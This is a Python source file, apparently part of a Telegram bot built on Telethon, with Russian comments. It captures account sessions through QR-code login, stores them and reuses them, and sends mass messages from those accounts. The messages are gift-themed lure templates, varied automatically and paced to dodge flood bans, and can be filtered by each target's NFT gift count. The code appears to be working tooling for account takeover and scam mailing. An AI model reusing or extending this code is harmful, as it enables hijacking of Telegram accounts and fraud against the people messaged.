class SessionManager:
    """Класс для управления сессиями Telethon"""
    
    def __init__(self, sessions_dir=SESSIONS_DIR):
        self.sessions_dir = sessions_dir
        self.active_sessions: Dict[int, TelegramClient] = {}
        self.auth_clients: Dict[int, Dict[str, Any]] = {}
        self.mailing_manager = MailingManager()
        self.traffic_collector = TrafficCollector()
        
        # Добавляем шаблоны сообщений для вариаций
        self.mailing_manager.add_message_template("Привет! У меня для тебя подарок 🎁")
        self.mailing_manager.add_message_template("Специально для тебя подготовил подарок!")
        self.mailing_manager.add_message_template("Хочешь получить подарок? 🎀")
        self.mailing_manager.add_message_template("У меня есть кое-что интересное для тебя ✨")
        
        # Создаем папку для сессий
        os.makedirs(self.sessions_dir, exist_ok=True)
        
        logger.info(f"📁 Папка с сессиями: {os.path.abspath(self.sessions_dir)}")
    
    def find_session_file(self, user_id: int) -> Optional[str]:
        """Находит файл сессии для пользователя"""
        # Сначала ищем по точному имени
        exact_file = os.path.join(self.sessions_dir, f"{user_id}.session")
        if os.path.exists(exact_file):
            return exact_file
        
        # Если не нашли, ищем любой .session файл
        session_files = list(Path(self.sessions_dir).glob("*.session"))
        if session_files:
            # Исключаем временные файлы
            for f in session_files:
                if not f.name.startswith("temp_"):
                    return str(f)
        
        return None
    
    def validate_session_file(self, session_file: str) -> bool:
        """Проверяет, является ли файл корректной сессией Telethon"""
        if not os.path.exists(session_file):
            logger.error(f"❌ Файл не существует: {session_file}")
            return False
        
        # Проверяем размер файла
        file_size = os.path.getsize(session_file)
        if file_size < 100:
            logger.error(f"❌ Файл слишком мал ({file_size} байт): {session_file}")
            return False
        
        # Проверяем, что это SQLite база данных
        try:
            conn = sqlite3.connect(session_file)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            conn.close()
            
            # Проверяем наличие таблицы sessions
            table_names = [t[0] for t in tables]
            if 'sessions' not in table_names:
                logger.error(f"❌ Файл не содержит таблицу 'sessions': {session_file}")
                return False
            
            logger.info(f"✅ Файл сессии прошел проверку: {session_file}")
            return True
            
        except sqlite3.DatabaseError as e:
            logger.error(f"❌ Файл не является SQLite базой: {e}")
            return False
        except Exception as e:
            logger.error(f"❌ Ошибка проверки файла: {e}")
            return False
    
    async def load_session(self, user_id: int) -> Optional[TelegramClient]:
        """Загружает сессию для пользователя"""
        # Если сессия уже загружена, возвращаем её
        if user_id in self.active_sessions:
            client = self.active_sessions[user_id]
            try:
                if client.is_connected() and await client.is_user_authorized():
                    logger.info(f"✅ Использую уже загруженную сессию для user_id: {user_id}")
                    return client
                else:
                    # Если клиент не работает, удаляем его
                    del self.active_sessions[user_id]
            except:
                del self.active_sessions[user_id]
        
        # Ищем файл сессии
        session_file = self.find_session_file(user_id)
        
        if not session_file:
            logger.warning(f"⚠️ Файл сессии не найден для user_id: {user_id}")
            return None
        
        # Загружаем сессию
        try:
            client = TelegramClient(session_file, API_ID, API_HASH)
            await client.connect()
            
            # Проверяем авторизацию
            if await client.is_user_authorized():
                me = await client.get_me()
                logger.info(f"✅ Сессия успешно загружена для @{me.username} (ID: {me.id})")
                
                # Сохраняем в активные сессии
                self.active_sessions[user_id] = client
                
                # Если файл назывался не по user_id, переименовываем
                expected_name = os.path.join(self.sessions_dir, f"{user_id}.session")
                if session_file != expected_name and not os.path.exists(expected_name):
                    try:
                        os.rename(session_file, expected_name)
                        logger.info(f"📝 Файл переименован в {expected_name}")
                    except:
                        pass
                
                return client
            else:
                logger.error(f"❌ Сессия не авторизована: {session_file}")
                await client.disconnect()
                return None
                
        except Exception as e:
            logger.error(f"❌ Ошибка загрузки сессии: {e}")
            
            # Если ошибка связана с базой данных, удаляем файл
            if "file is not a database" in str(e):
                logger.warning(f"🗑 Удаляем поврежденный файл: {session_file}")
                try:
                    os.remove(session_file)
                except:
                    pass
            
            return None
    
    async def create_qr_client(self, user_id: int) -> TelegramClient:
        """Создает временного клиента для QR-авторизации"""
        session_file = os.path.join(self.sessions_dir, f"temp_{user_id}.session")
        
        # Удаляем старый временный файл, если есть
        if os.path.exists(session_file):
            try:
                os.remove(session_file)
            except:
                pass
        
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        
        return client
    
    async def generate_qr(self, user_id: int) -> tuple[Optional[bytes], Optional[str]]:
        """Генерирует QR-код для авторизации"""
        try:
            # Создаем временного клиента
            client = await self.create_qr_client(user_id)
            
            # Запрашиваем токен для QR
            result = await client(functions.auth.ExportLoginTokenRequest(
                api_id=API_ID,
                api_hash=API_HASH,
                except_ids=[]
            ))
            
            # Сохраняем клиент и токен
            self.auth_clients[user_id] = {
                'client': client,
                'token': result.token,
                'expires': result.expires,
                'created_at': time.time()
            }
            
            # Формируем ссылку для QR
            token_b64 = base64.b64encode(result.token).decode('utf-8')
            qr_link = f"tg://login?token={token_b64}"
            
            # Генерируем QR-код
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=10,
                border=4,
            )
            
            qr.add_data(qr_link)
            qr.make(fit=True)
            
            # Создаем изображение
            img = qr.make_image(fill_color="black", back_color="white")
            
            # Конвертируем в байты
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            
            return img_bytes.getvalue(), token_b64
            
        except Exception as e:
            logger.error(f"❌ Ошибка генерации QR: {e}")
            return None, None
    
    async def check_qr_login(self, user_id: int, two_fa_password: str = None) -> tuple[Optional[TelegramClient], str]:
        """
        Проверяет, выполнен ли вход по QR
        Возвращает (клиент, статус)
        Статусы: 'success', '2fa', 'wrong_password', 'expired', 'waiting', 'error'
        """
        if user_id not in self.auth_clients:
            return None, 'no_session'
        
        auth_data = self.auth_clients[user_id]
        client = auth_data['client']
        
        try:
            # Проверяем, не истек ли токен (60 секунд)
            if time.time() - auth_data['created_at'] > 60:
                logger.warning(f"⚠️ Токен истек для user_id: {user_id}")
                return None, 'expired'
            
            # Проверяем, авторизован ли уже клиент
            if await client.is_user_authorized():
                return await self._finalize_session(user_id, client), 'success'
            
            # Если передан пароль 2FA
            if two_fa_password:
                try:
                    # Пробуем войти с паролем
                    await client.sign_in(password=two_fa_password)
                    
                    # Проверяем авторизацию
                    if await client.is_user_authorized():
                        return await self._finalize_session(user_id, client), 'success'
                    else:
                        return None, 'waiting'
                        
                except PasswordHashInvalidError:
                    return None, 'wrong_password'
                except SessionPasswordNeededError:
                    # Все еще требуется 2FA
                    return None, '2fa'
                except Exception as e:
                    logger.error(f"❌ Ошибка при 2FA: {e}")
                    return None, 'error'
            
            # Проверяем, нужно ли ввести пароль 2FA
            try:
                # Пытаемся импортировать токен
                await client(functions.auth.ImportLoginTokenRequest(
                    token=auth_data['token']
                ))
                
                # Если успешно, проверяем авторизацию
                if await client.is_user_authorized():
                    return await self._finalize_session(user_id, client), 'success'
                else:
                    return None, 'waiting'
                    
            except SessionPasswordNeededError:
                # Требуется 2FA
                logger.info(f"🔐 Требуется 2FA для user_id: {user_id}")
                return None, '2fa'
                
            except Exception as e:
                if "AUTH_TOKEN_ALREADY_ACCEPTED" in str(e):
                    # Токен уже принят - проверяем авторизацию
                    if await client.is_user_authorized():
                        return await self._finalize_session(user_id, client), 'success'
                
                logger.debug(f"Ошибка импорта токена: {e}")
                return None, 'waiting'
                
        except Exception as e:
            logger.error(f"❌ Ошибка проверки QR: {e}")
            return None, 'error'
    
    async def _finalize_session(self, user_id: int, client: TelegramClient) -> TelegramClient:
        """Завершает настройку сессии после успешного входа"""
        try:
            me = await client.get_me()
            logger.info(f"✅ QR-авторизация успешна для @{me.username}")
            
            # Сохраняем постоянную сессию
            permanent_file = os.path.join(self.sessions_dir, f"{user_id}.session")
            temp_file = os.path.join(self.sessions_dir, f"temp_{user_id}.session")
            
            # Сохраняем сессию
            await client.disconnect()
            await client.connect()
            
            # Перемещаем файл из временного в постоянный
            if os.path.exists(temp_file):
                if os.path.exists(permanent_file):
                    try:
                        os.remove(permanent_file)
                    except:
                        pass
                try:
                    os.rename(temp_file, permanent_file)
                    logger.info(f"📁 Сессия сохранена: {permanent_file}")
                except Exception as e:
                    logger.error(f"Ошибка переименования файла: {e}")
            
            # Сохраняем в активные сессии
            self.active_sessions[user_id] = client
            
            # Удаляем временные данные
            if user_id in self.auth_clients:
                del self.auth_clients[user_id]
            
            return client
            
        except Exception as e:
            logger.error(f"❌ Ошибка при финализации сессии: {e}")
            return client
    
    async def close_session(self, user_id: int):
        """Закрывает сессию пользователя"""
        if user_id in self.active_sessions:
            try:
                await self.active_sessions[user_id].disconnect()
            except:
                pass
            del self.active_sessions[user_id]
            logger.info(f"🔒 Сессия закрыта для user_id: {user_id}")
        
        # Закрываем временные клиенты
        if user_id in self.auth_clients:
            try:
                await self.auth_clients[user_id]['client'].disconnect()
            except:
                pass
            del self.auth_clients[user_id]
    
    async def send_safe_message(self, user_id: int, target_username: str, message: str, mode: str = "normal") -> Tuple[bool, str]:
        """
        Отправляет сообщение с защитой от флуд-бана
        mode: "normal" - обычная рассылка, "nft" - рассылка с проверкой NFT
        Возвращает (успех, статус)
        """
        client = await self.load_session(user_id)
        
        if not client:
            return False, "❌ Сессия не загружена"
        
        # Проверяем лимиты
        can_send, limit_msg = self.mailing_manager.check_limits(user_id)
        if not can_send:
            return False, limit_msg
        
        try:
            # Получаем информацию о пользователе
            try:
                entity = await client.get_entity(target_username)
            except ValueError:
                return False, "❌ Неверный юзернейм"
            
            # Если режим NFT, проверяем количество подарков
            if mode == "nft":
                nft_count = await self.mailing_manager.get_nft_gift_count(client, entity.id)
                
                if nft_count > MAX_NFT_GIFTS:
                    return False, f"⏭ У пользователя {nft_count} NFT подарков (больше {MAX_NFT_GIFTS})"
            
            # Вариация сообщения
            final_message = self.mailing_manager.get_message_variation(message)
            
            # Отправляем сообщение
            await client.send_message(entity, final_message)
            
            # Увеличиваем счетчики
            self.mailing_manager.increment_counters(user_id)
            
            return True, "✅ Сообщение отправлено"
            
        except FloodWaitError as e:
            wait_time = e.seconds
            logger.warning(f"⏱ Флуд-контроль: ожидание {wait_time}с")
            
            # При флуде ждем указанное время + рандом
            await asyncio.sleep(wait_time + random.randint(5, 15))
            
            return False, f"⏱ Флуд-контроль: ожидание {wait_time}с"
            
        except Exception as e:
            error = str(e)
            if "USER_IS_BLOCKED" in error:
                return False, "❌ Пользователь заблокировал аккаунт"
            elif "USER_IS_DEACTIVATED" in error:
                return False, "❌ Аккаунт удален"
            else:
                logger.error(f"Ошибка отправки: {error}")
                return False, f"❌ Ошибка: {error[:50]}"

